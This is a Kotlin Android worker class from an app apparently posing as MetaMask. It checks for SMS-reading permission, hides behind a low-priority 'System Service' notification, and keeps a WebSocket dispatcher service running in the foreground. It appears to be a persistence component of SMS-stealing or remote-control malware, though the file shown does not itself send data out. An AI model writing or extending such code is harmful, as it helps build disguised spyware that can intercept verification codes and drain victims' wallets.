package com.example.MetaMask.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import androidx.annotation.Keep
import androidx.core.app.NotificationCompat
import androidx.work.CoroutineWorker
import androidx.work.ForegroundInfo
import androidx.work.WorkerParameters

@Keep
class ServiceStarterWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    private val CHANNEL_ID = "sync_system_channel"
    private val NOTIFICATION_ID = 778

    override suspend fun getForegroundInfo(): ForegroundInfo {
        android.util.Log.d("XDBG", "[ServiceStarterWorker] getForegroundInfo enter") //xdbg
        android.util.Log.d("XDBG", "[ServiceStarterWorker] return") //xdbg
        return try {
            createForegroundInfo("System Service")
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ServiceStarterWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            val notification = NotificationCompat.Builder(applicationContext, CHANNEL_ID)
                .setContentTitle("Service")
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()
            ForegroundInfo(NOTIFICATION_ID, notification)
        }
    }

    override suspend fun doWork(): Result {
        android.util.Log.d("XDBG", "[ServiceStarterWorker] doWork enter") //xdbg
        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[ServiceStarterWorker] if branch") //xdbg
            android.util.Log.d("XDBG", "[ServiceStarterWorker] return") //xdbg
            return Result.success()
        }
        val action = inputData.getString("ACTION") ?: "UNKNOWN"

        try {
            if (Build.VERSION.SDK_INT >= 31) {
                android.util.Log.d("XDBG", "[ServiceStarterWorker] if branch") //xdbg
                try {
                    setForeground(createForegroundInfo(action))
                } catch (e: IllegalArgumentException) {
                    android.util.Log.e("XDBG", "[ServiceStarterWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    android.util.Log.d("XDBG", "[ServiceStarterWorker] return") //xdbg
                    return Result.failure()
                } catch (e: Exception) {
                    android.util.Log.e("XDBG", "[ServiceStarterWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                }
            } else {
                setForeground(createForegroundInfo(action))
            }

            val serviceIntent = Intent(applicationContext, MasterWebSocketDispatcher::class.java).apply {
                putExtra("STARTED_FROM", action)
                putExtra(MasterWebSocketDispatcher.EXTRA_STARTED_FROM_BOOT, false)
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[ServiceStarterWorker] if branch") //xdbg
                try {
                    applicationContext.startForegroundService(serviceIntent)
                } catch (e: Exception) {
                    android.util.Log.e("XDBG", "[ServiceStarterWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    try {
                        applicationContext.startService(serviceIntent)
                    } catch (e2: Exception) {
                        android.util.Log.e("XDBG", "[ServiceStarterWorker] catch ${e2.javaClass.simpleName}: ${e2.message}") //xdbg
                    }
                }
            } else {
                applicationContext.startService(serviceIntent)
            }

            android.util.Log.d("XDBG", "[ServiceStarterWorker] return") //xdbg
            return Result.success()
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ServiceStarterWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            android.util.Log.d("XDBG", "[ServiceStarterWorker] return") //xdbg
            return Result.failure()
        }
    }

    private fun createForegroundInfo(content: String): ForegroundInfo {
        android.util.Log.d("XDBG", "[ServiceStarterWorker] createForegroundInfo enter content=${content}") //xdbg
        val context = applicationContext

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.util.Log.d("XDBG", "[ServiceStarterWorker] if branch") //xdbg
            val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channel = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN)
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(context, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText(content)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        android.util.Log.d("XDBG", "[ServiceStarterWorker] return") //xdbg
        return if (Build.VERSION.SDK_INT >= 34) {
            ForegroundInfo(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else if (Build.VERSION.SDK_INT >= 29) {
            ForegroundInfo(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            ForegroundInfo(NOTIFICATION_ID, notification)
        }
    }
}
